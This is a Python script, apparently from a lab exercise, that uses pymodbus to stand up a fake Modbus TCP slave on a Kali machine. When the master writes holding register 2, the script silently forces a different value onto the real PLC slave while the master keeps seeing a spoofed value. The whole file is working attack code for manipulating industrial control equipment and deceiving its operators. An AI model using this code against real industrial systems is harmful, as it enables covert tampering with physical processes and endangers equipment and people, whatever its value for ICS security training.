#!/usr/bin/env python3
from pymodbus.server.sync import StartTcpServer
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext, ModbusSequentialDataBlock

# =========================
# CONFIG (ændr kun her)
# =========================
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 502          # Kali "fake slave" lytter her

MASTER_UNIT = 1            # unit-id som Modbus Poll bruger

REAL_SLAVE_IP = "192.168.70.61"
REAL_SLAVE_PORT = 502      # rigtig slave port
REAL_SLAVE_UNIT = 1

TARGET_REG = 2
MASTER_SEES_VALUE = 43
FORWARD_VALUE = 123

REG_COUNT = 100            # antal holding regs i fake slave
# =========================


def fmt(vals):
    return "[" + ",".join(map(str, vals)) + "]"


real = ModbusTcpClient(REAL_SLAVE_IP, port=REAL_SLAVE_PORT, timeout=2)
if not real.connect():
    raise SystemExit(f"[!] Could not connect to real slave {REAL_SLAVE_IP}:{REAL_SLAVE_PORT}")


class Block(ModbusSequentialDataBlock):
    def getValues(self, address, count=1):
        vals = super().getValues(address, count)
        print(f"READ  HR[{address}:{address+count-1}]  IN(master)->Kali = {fmt(vals)}")
        return vals

    def setValues(self, address, values):
        # Log inbound write from master
        in_line = f"WRITE HR[{address}]  IN(master)->Kali = {fmt(values)}"

        out_line = ""
        if address == TARGET_REG:
            # Force value on real slave
            rr = real.write_register(TARGET_REG, FORWARD_VALUE, unit=REAL_SLAVE_UNIT)
            if rr.isError():
                out_line = f" | OUT(Kali)->Slave {REAL_SLAVE_IP}:{REAL_SLAVE_PORT} = ERROR {rr}"
            else:
                out_line = f" | OUT(Kali)->Slave {REAL_SLAVE_IP}:{REAL_SLAVE_PORT} = HR[{TARGET_REG}]={FORWARD_VALUE}"

        print(in_line + out_line)
        super().setValues(address, values)


block = Block(0, [0] * REG_COUNT)
block.setValues(TARGET_REG, [MASTER_SEES_VALUE])  # hvad master ser lokalt

store = ModbusSlaveContext(hr=block)
context = ModbusServerContext(slaves=store, single=True)

print(f"[+] Fake slave listening: {LISTEN_IP}:{LISTEN_PORT} (unit={MASTER_UNIT})")
print(f"[+] Forward target slave: {REAL_SLAVE_IP}:{REAL_SLAVE_PORT} (unit={REAL_SLAVE_UNIT})")
print(f"[+] Rule: when master writes HR[{TARGET_REG}] => slave gets {FORWARD_VALUE}, master sees {MASTER_SEES_VALUE}\n")

StartTcpServer(context, address=(LISTEN_IP, LISTEN_PORT))
